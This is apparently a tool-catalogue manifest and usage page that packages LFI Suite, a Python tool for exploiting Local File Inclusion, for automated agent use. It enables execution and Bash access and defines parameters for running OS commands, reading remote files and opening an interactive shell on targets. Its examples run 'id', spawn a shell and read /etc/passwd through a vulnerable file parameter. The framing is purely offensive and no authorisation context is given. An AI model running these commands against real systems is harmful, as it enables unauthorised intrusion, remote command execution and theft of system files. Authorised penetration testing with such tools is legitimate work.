---
id: security-web-lfi-suite
namespace: security:web:lfi-suite
name: lfi-suite
description: Local File Inclusion exploitation suite that automates LFI detection, file reading, RCE via log poisoning, and PHP wrapper attacks.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - web.lfi.scan
  - web.lfi.exploit
  - web.lfi.rce
  - web.lfi.read-file
  - web.lfi.php-wrapper
platforms:
  - linux
  - macos
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
related_tools:
  - kadimus
  - commix
  - tplmap
artifacts:
  - type: web.lfi.output
    description: LFI exploitation results
    mime: text/plain
    trust_level: verified
  - type: web.lfi.shell
    description: Remote shell access
    mime: text/plain
    trust_level: verified
workflow_edges:
  produces:
    - lfi-scan-results
    - remote-access
  consumes:
    - target-url
contract:
  inputs:
    - type: web.target.url
      description: Target URL with file parameter
  outputs:
    - type: web.lfi.output
      description: File content or command output
      mime: text/plain
  side_effects:
    - network_traffic
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 64
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 64
  network: low
  disk_io: low
allowed-tools:
  - lfi-suite
  - lfi.py
  - python3
  - Bash
  - execFile
parameters:
  - name: target
    type: string
    required: true
    description: "Target URL"
    aliases:
      - -t
      - --target
  - name: flag-type
    type: string
    required: false
    description: "Exploit type (basic, expect, input, enc, etc.)"
    aliases:
      - --type
  - name: flag-os-cmd
    type: string
    required: false
    description: "OS command to execute"
    aliases:
      - --os-cmd
  - name: flag-read-file
    type: string
    required: false
    description: "File to read on remote system"
    aliases:
      - --read-file
  - name: flag-shell
    type: boolean
    required: false
    description: "Interactive shell mode"
    aliases:
      - --shell
  - name: flag-proxy
    type: string
    required: false
    description: "HTTP proxy"
    aliases:
      - --proxy
execution:
  template: "python3 lfi.py {flag-type} {flag-os-cmd} {flag-read-file} {flag-shell} {flag-proxy} -t {target}"
  sandbox: execFile
  timeout_seconds: 120
  shell: false
examples:
  - description: "Basic LFI scan"
    command: python3 lfi.py -t "http://example.com/page.php?file=test"
  - description: "Execute command on target"
    command: python3 lfi.py -t "http://example.com/page.php?file=test" --os-cmd "id"
  - description: "Interactive shell"
    command: python3 lfi.py -t "http://example.com/page.php?file=test" --shell
references:
  - label: "LFI Suite GitHub"
    url: "https://github.com/D35m0nd142/LFISuite"
phase: exploitation
techniques:
  - execution
  - discovery
items:
  - Shell
  - NoCreds
services:
  - HTTP
attack_types:
  - Exploitation
  - Execution
install:
    - method: git
      repo_url: "https://github.com/D35m0nd142/LFISuite.git"
      commands:
        - "git clone https://github.com/D35m0nd142/LFISuite.git"
---

# LFI Suite — Local File Inclusion Exploitation Suite

LFI Suite is a Python-based tool for detecting and exploiting Local File Inclusion vulnerabilities. It supports multiple PHP wrapper techniques, log poisoning for RCE, reverse shell generation, and automated exploitation.

## Usage

```bash
# Basic scan
python3 lfi.py -t "http://target.com/page.php?file=test"

# Execute command
python3 lfi.py -t "http://target.com/page.php?file=test" --os-cmd "id"

# Interactive shell
python3 lfi.py -t "http://target.com/page.php?file=test" --shell

# Read specific file
python3 lfi.py -t "http://target.com/page.php?file=test" --read-file /etc/passwd
```
